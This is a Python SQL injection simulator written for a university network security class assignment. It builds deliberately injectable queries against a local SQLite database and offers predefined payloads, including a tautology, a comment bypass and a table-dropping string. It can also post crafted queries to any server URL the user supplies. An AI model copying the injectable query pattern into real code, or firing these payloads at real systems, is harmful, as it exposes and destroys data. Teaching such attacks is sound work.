import sqlite3
import os

"""
Python 3.9.7
Date: 2023-10-15 14:30:45
Author: Clint and Constantine
CSCEA465 Network Security
Peer Learning Assignment: Team: Database B
  - Team Lead: Constantine
  - Offense Team: Constantine, Clint
  - Defense Team: Gwen, Nicasio

Offense Method: SQL Injection
This program simulates SQL injection attacks against a centralized database in a standalone, controlled environment.
It is designed for educational purposes to demonstrate how SQL injection works and how to prevent it.

Key Features:
  - SQL Injection Simulation: Allows users to simulate SQL injection attacks in a controlled environment.
  - Dynamic Query Input: Users can choose from default queries, manually input queries, or select from predefined queries.
  - User-Friendly Menu: Provides a clear and interactive menu for selecting attacks and viewing results.
  - Debugging Information: Displays detailed debug information for database connections and query execution.
  - Dynamic Programming: Precomputes and stores reusable data structures to optimize performance.
  - Centralized String Management: All prompts and messages are stored in the class body for easy modification and localization.
  - Enhanced User Interaction: 
    - Press {input_return} to return to the main menu at any time.
    - Press {input_quit} to quit the program entirely.
  - Database Flexibility: Supports multiple database types (e.g., SQLite3) via a dispatch dictionary.

Key Classes and Functions:
  - SQLInjectionAttacks: Main class for managing SQL injection attacks.
    - get_user_credentials: Simulates an SQL injection attack to extract user credentials.
    - display_menu: Displays a formatted menu of available attacks and statistics.
    - get_user_choice: Prompts the user to select an attack by number or name.
    - get_query_input: Prompts the user to input a query or select from predefined options.
    - main_menu: Main loop for interacting with the user.
    - get_handle_query: Generalized handler for query input options (default, manual, predefined).
  - manage_db_connection: Manages database connections and executes attacks.
  - execute_attack: Executes the selected attack based on the attack ID and query.

Usage:
  - Run the script and follow the on-screen instructions to simulate SQL injection attacks.
  - Use the menu to select attacks, input queries, and view results.
  - Press {input_return} to return to the main menu or {input_quit} to quit the program at any time.

Notes:
  - This program is for educational purposes only and should not be used for malicious purposes.
  - Ensure the database file exists and is accessible before running attacks.
"""
import sqlite3
import os
import platform
import requests  # For making HTTP requests to target servers

class SQLInjectionAttacks:
    def __init__(self):
        """
        Initialize the class with a dictionary of available attacks and counters.
        """
        self.attacks = {
            1: {
                "function": self.get_user_credentials,
                "sqli_name": "Extract User Credentials",
                "default_query": "'OR '1' = '1"  # Default query for this attack
            },
            2: {
                "function": self.target_server,
                "sqli_name": "Target Server (e.g., Docker)",
                "default_query": "'OR '1' = '1"  # Default query for this attack
            }
            # Add more attacks here as needed
        }
        self.successful_attacks = 0  # Counter for successful attacks
        self.unsuccessful_attacks = 0  # Counter for unsuccessful attacks
        self.max_length = 0  # Maximum length of menu lines (used for scaling)
        self.current_default_query = ""  # Track default query for handlers

        # Input keys for user interaction
        self.input_return = 'r'  # Key to return to the main menu
        self.input_quit = 'q'  # Key to quit the program

        # Database name (e.g., SQLite3)
        self.db_name = "SQLite3"  # Can be changed to another database name if needed

        # Database connection dispatch dictionary
        self.db_connection_functions = {
            "sqlite3": sqlite3.connect,  # SQLite3 connection function
            # Add other database connection functions here as needed
            # Example: "mysql": mysql.connector.connect,
            # Example: "postgresql": psycopg2.connect,
        }

        # Initialize handler dispatch dictionary
        self.handlers = {
            '1': lambda: self.get_handle_query('default'),
            '2': lambda: self.get_handle_query('manual'),
            '3': lambda: self.get_handle_query('predefined')
        }

        # Prompts to the user
        self.prompt_welcome = "Welcome to the SQL Injection Simulator!"
        self.prompt_description = "This program demonstrates SQL injection attacks in a controlled environment."
        self.prompt_instructions = f"Follow the instructions below to simulate an attack. Press {self.input_quit} to quit or {self.input_return} to return to the main menu at any time."
        self.prompt_attack_choice = f"\nEnter the attack number or name (or press {self.input_return} to return to the main menu): "
        self.prompt_db_file = f"Enter the database file name or path (default: test.db, or press {self.input_return} to return to the main menu): "
        self.prompt_query_options = "=== Query Input Options ==="
        self.prompt_query_default = "1. Use default query (if available)"
        self.prompt_query_manual = "2. Manually input username/query"
        self.prompt_query_predefined = "3. Select from a list of predefined queries"
        self.prompt_query_separator = "==========================="
        self.prompt_query_choice = f"Enter your choice (1, 2, or 3, or press {self.input_return} to return to the main menu): "
        self.prompt_username = f"Enter the username/query to probe (or press {self.input_return} to return to the main menu): "
        self.prompt_executing = "\nExecuting {}..."
        self.prompt_results = "\nAttack Results:"
        self.prompt_no_results = "\nNo results found or an error occurred."
        self.prompt_continue = f"\nDo you want to perform another attack? (y/n, or press {self.input_return} to return to the main menu): "
        self.prompt_exit = "Exiting the program. Goodbye!"

        # Debug and informational prompts
        self.prompt_db_connect_attempt = f"{self.db_name}: Attempting to connect to {{}}..."
        self.prompt_db_connect_success = f"{self.db_name}: Established connection to {{}}!"
        self.prompt_db_cursor_init = f"{self.db_name}: Initializing cursor..."
        self.prompt_db_cursor_success = f"{self.db_name}: Cursor initialized!"
        self.prompt_query_execution = "\nExecuting Query: {}"
        self.prompt_extraction_success = "Extraction Successful!\n"
        self.prompt_extraction_failure = "Extraction Unsuccessful.\n"
        self.prompt_invalid_choice = f"Invalid choice. Please try again or press {self.input_return} to return to the main menu."
        self.prompt_invalid_option = f"Invalid option. Please try again or press {self.input_return} to return to the main menu."
        self.prompt_no_default_query = "No default query available for this attack. Please choose another option."
        self.prompt_using_default_query = "Using default query: {}"

        # Predefined queries
        self.predefined_queries = [
            "'OR '1' = '1",
            "admin' --",
            "'; DROP TABLE users; --"
        ]

        # Predefined query menu lines (moved to class body for reusability)
        self.predefined_lines = [
            "=== Predefined Queries ===",
            *[f"{i}. {query}" for i, query in enumerate(self.predefined_queries, start=1)],
            "========================="
        ]

        # Query input options (precomputed for dynamic programming)
        self.query_options = [
            self.prompt_query_options,
            self.prompt_query_default,
            self.prompt_query_manual,
            self.prompt_query_predefined,
            self.prompt_query_separator
        ]

        # Menu description (precomputed for dynamic programming)
        self.menu_description = [
            self.prompt_welcome,
            self.prompt_description,
            self.prompt_instructions
        ]

        # Menu options (precomputed for dynamic programming)
        self.menu_lines = [
            "=== SQL Injection Attack Menu ===",
            *[f"{attack_ID}. {attack_info['sqli_name']}" for attack_ID, attack_info in self.attacks.items()],
            "================================",
            f"Successful Attacks: {self.successful_attacks}",
            f"Unsuccessful Attacks: {self.unsuccessful_attacks}",
            "================================"
        ]

    def clear_screen(self):
        """
        Clears the terminal screen.
        """
        if platform.system() == "Windows":
            os.system("cls")
        else:
            os.system("clear")

    def manage_db_connection(self, attack_ID, query, db='test.db'):
        """
        Manages the database connection and executes the selected attack.
        Uses a dispatch dictionary to determine the appropriate database connection function.
        """
        try:
            # Get the database connection function based on self.db_name
            db_connect_function = self.db_connection_functions.get(self.db_name.lower())
            if not db_connect_function:
                raise ValueError(f"Unsupported database type: {self.db_name}")

            print(self.prompt_db_connect_attempt.format(db))  # Debug
            db_connection = db_connect_function(db)  # Connect to the database
            print(self.prompt_db_connect_success.format(db))  # Debug

            print(self.prompt_db_cursor_init)  # Debug
            db_cursor = db_connection.cursor()  # Create a cursor
            print(self.prompt_db_cursor_success)  # Debug

            # Execute the selected attack
            result = self.execute_attack(attack_ID, query, db_connection, db_cursor)

            return result

        except Exception as e:
            print(f"Database error: {e}")
            return None

        finally:
            # Close the connection
            if db_connection:
                db_connection.close()

    def execute_attack(self, attack_ID, query, db_connection, db_cursor):
        """
        Executes the attack based on the attack_ID and provided query.
        """
        if attack_ID in self.attacks:
            return self.attacks[attack_ID]["function"](query, db_connection, db_cursor)
        else:
            raise ValueError(f"Invalid attack_ID: {attack_ID}")

    def get_user_credentials(self, query, db_connection, db_cursor):
        """
        Probes the database for vulnerabilities and attempts to extract all users.
        """
        # Construct the query
        probe_query = f"SELECT * FROM users WHERE username = '{query}'"
        print(self.prompt_query_execution.format(probe_query))  # Debug

        db_cursor.execute(probe_query)

        # If successful, collect all user data
        probe_result = db_cursor.fetchall()  # Returns a list of tuples or an empty list
        if len(probe_result) > 0:
            print(self.prompt_extraction_success)
            self.successful_attacks += 1  # Increment successful attacks counter
        else:
            print(self.prompt_extraction_failure)
            self.unsuccessful_attacks += 1  # Increment unsuccessful attacks counter

        return probe_result

    def target_server(self, query, db_connection, db_cursor):
        """
        Simulates an SQL injection attack against a server (e.g., Docker container).
        This method sends a malicious query to a server running a database service.
        """
        # Prompt the user for the server URL (e.g., http://localhost:8080)
        server_url = input("Enter the server URL (e.g., http://localhost:8080): ").strip()
        if not server_url:
            print("No server URL provided. Returning to main menu.")
            return None

        # Construct the malicious query
        malicious_query = f"SELECT * FROM users WHERE username = '{query}'"
        print(f"Sending malicious query to server: {malicious_query}")

        try:
            # Simulate sending the query to the server (e.g., via HTTP POST)
            response = requests.post(server_url, data={"query": malicious_query})
            if response.status_code == 200:
                print(self.prompt_extraction_success)
                self.successful_attacks += 1  # Increment successful attacks counter
                return response.json()  # Assuming the server returns JSON data
            else:
                print(self.prompt_extraction_failure)
                self.unsuccessful_attacks += 1  # Increment unsuccessful attacks counter
                return None
        except Exception as e:
            print(f"Server error: {e}")
            return None

    def print_centered(self, text):
        """
        Prints text centered in the terminal window.
        """
        for line in text.splitlines():
            print(line.center(self.max_length))

    def display_menu(self):
        """
        Displays a formatted menu of available SQL injection methods and attack statistics.
        """
        # Combine description and menu lines
        full_menu = self.menu_description + [""] + self.menu_lines

        # Determine the longest line in the menu
        self.max_length = max(len(line) for line in full_menu)

        # Print the menu without stars
        for line in full_menu:
            print(line.center(self.max_length))

    def get_user_choice(self):
        """
        Prompts the user to select an attack by number or name.
        """
        while True:
            choice = input(self.prompt_attack_choice).strip().lower()
            if choice == self.input_quit:
                print(self.prompt_exit)
                exit()  # Quit the program
            if choice == self.input_return:
                return None  # Return to main menu
            # Check if the input is a valid attack number
            if choice.isdigit() and int(choice) in self.attacks:
                return int(choice)
            # Check if the input is a valid attack name
            for attack_ID, attack_info in self.attacks.items():
                if choice == attack_info["sqli_name"].lower():
                    return attack_ID
            print(self.prompt_invalid_choice)

    def get_handle_query(self, query_type):
        """
        Generalized handler for query input options (default, manual, predefined).
        Repeated code is moved outside the if/elif/else blocks.
        """
        # Common variables and logic
        if query_type == 'default':
            if self.current_default_query:
                print(self.prompt_using_default_query.format(self.current_default_query))
                return self.current_default_query
            else:
                print(self.prompt_no_default_query)
                return None

        elif query_type == 'manual':
            username = input(self.prompt_username).strip()
            if username.lower() == self.input_quit:
                print(self.prompt_exit)
                exit()  # Quit the program
            if username.lower() == self.input_return:
                return None  # Return to main menu
            return username

        elif query_type == 'predefined':
            # Print the predefined queries
            for line in self.predefined_lines:
                print(line.center(self.max_length))

            query_choice = input("Select a query by number: ").strip().lower()
            if query_choice == self.input_quit:
                print(self.prompt_exit)
                exit()  # Quit the program
            if query_choice == self.input_return:
                return None  # Return to main menu
            if query_choice.isdigit() and 1 <= int(query_choice) <= len(self.predefined_queries):
                return self.predefined_queries[int(query_choice) - 1]
            else:
                print(self.prompt_invalid_choice)
                return None

        else:
            raise ValueError(f"Invalid query type: {query_type}")

    def get_query_input(self, attack_ID):
        """
        Prompts the user to select a query option using class-level handlers.
        """
        attack_info = self.attacks[attack_ID]
        self.current_default_query = attack_info.get("default_query", "")  # Store for handlers

        # Print the query input options
        for line in self.query_options:
            print(line.center(self.max_length))

        while True:
            option = input(self.prompt_query_choice).strip().lower()
            if option == self.input_quit:
                print(self.prompt_exit)
                exit()  # Quit the program
            if option == self.input_return:
                return None  # Return to main menu

            handler = self.handlers.get(option)
            if handler:
                result = handler()
                if result is not None:
                    return result
            else:
                print(self.prompt_invalid_option)

    def main_menu(self):
        """
        Main menu function to interact with the user.
        Loops until the user enters "n" to exit.
        """
        while True:
            # Display the menu
            self.display_menu()

            # Get the user's choice
            attack_ID = self.get_user_choice()
            if attack_ID is None:
                continue  # Return to main menu

            # Get the database file name or path
            db = input(self.prompt_db_file).strip()
            if db.lower() == self.input_quit:
                print(self.prompt_exit)
                break  # Quit the program
            if db.lower() == self.input_return:
                continue  # Return to main menu
            if not db:
                db = 'test.db'

            # Check if the user entered a database type (e.g., SQLite3)
            if db.lower() in self.db_connection_functions:
                self.db_name = db  # Update the database type
                db = 'test.db'  # Use the default database file

            # Get the query input
            query = self.get_query_input(attack_ID)
            if query is None:
                continue  # Return to main menu

            # Clear the screen before executing the attack
            self.clear_screen()

            # Execute the selected attack
            print(self.prompt_executing.format(self.attacks[attack_ID]['sqli_name']))
            result = self.manage_db_connection(attack_ID, query, db)

            # Display the results
            if result:
                print(self.prompt_results)
                for row in result:
                    print(row)
            else:
                print(self.prompt_no_results)

            # Ask the user if they want to continue
            continue_choice = input(self.prompt_continue).strip().lower()
            if continue_choice == self.input_quit:
                print(self.prompt_exit)
                break  # Quit the program
            if continue_choice == self.input_return:
                continue  # Return to main menu
            if continue_choice != 'y':
                print(self.prompt_exit)
                break


# Example usage
if __name__ == "__main__":
    # Create an instance of the class
    sql_attacks = SQLInjectionAttacks()

    # Run the main menu
    sql_attacks.main_menu()